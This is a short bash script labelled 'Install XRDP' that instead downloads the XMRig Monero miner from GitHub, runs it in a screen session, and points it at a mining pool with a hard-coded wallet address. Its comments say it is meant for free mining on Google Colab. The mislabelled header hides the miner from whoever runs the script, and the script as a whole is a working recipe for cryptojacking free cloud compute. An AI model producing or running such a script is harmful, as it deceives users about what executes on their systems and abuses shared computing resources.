#! /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget https://github.com/xmrig/xmrig/releases/download/v6.18.1/xmrig-6.18.1-linux-static-x64.tar.gz
tar xvzf xmrig-6.18.1-linux-static-x64.tar.gz
cd xmrig-6.18.1
./xmrig -o xmr.pool.gntl.co.uk:20009 -u 44Gcsim6a2UF9sr845hSYdWrPJf8SLitSMuzZfY3kVdqha5q7vCJbXwFc1GkHpvrZdEdkfCufofinJFbZBqQhyznSHv6uMP -k --tls -p a2nk
